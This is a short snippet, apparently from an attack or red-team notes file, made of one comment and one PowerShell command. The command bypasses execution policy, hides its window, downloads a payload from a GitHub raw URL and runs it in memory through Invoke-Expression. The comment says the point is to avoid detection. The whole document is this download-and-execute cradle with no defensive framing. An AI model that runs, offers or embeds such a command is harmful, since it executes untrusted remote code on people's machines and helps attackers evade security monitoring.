# the file is downloaded and executed in memory to avoid detection 
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/subfission/H0ney/master/payload.txt') | iex"
